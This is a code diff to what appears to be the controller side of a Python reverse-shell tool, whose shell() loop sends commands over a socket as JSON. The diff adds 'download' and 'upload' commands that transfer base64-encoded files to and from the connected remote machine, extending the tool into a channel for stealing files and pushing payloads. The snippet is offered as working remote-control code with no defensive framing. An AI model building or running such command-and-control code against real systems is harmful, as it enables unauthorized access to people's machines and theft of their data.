@@ -4,6 +4,7 @@
 import socket
 from termcolor import colored
 import json
+import base64
 
 
 def json_send(data):
@@ -32,6 +33,20 @@ def shell():
 			break
 		elif command[:2] == "cd" and len(command) > 1:
 			continue
+
+		elif command[:8] == "download":
+			with open(command[9:], "wb") as docs:
+				docs_data = json_recv()
+				docs.write(base64.b64decode(docs_data))
+
+		elif command[:6] == "upload":
+			try:
+				with open(command[7:], "rb") as docs:
+					json_send(base64.b64encode(docs.read()))
+
+			except:
+				failed_message = "Unable to upload file/folder"
+				json_send(base64.b64encode(failed_message))
 		else:
 			result = json_recv()
 			print(result)
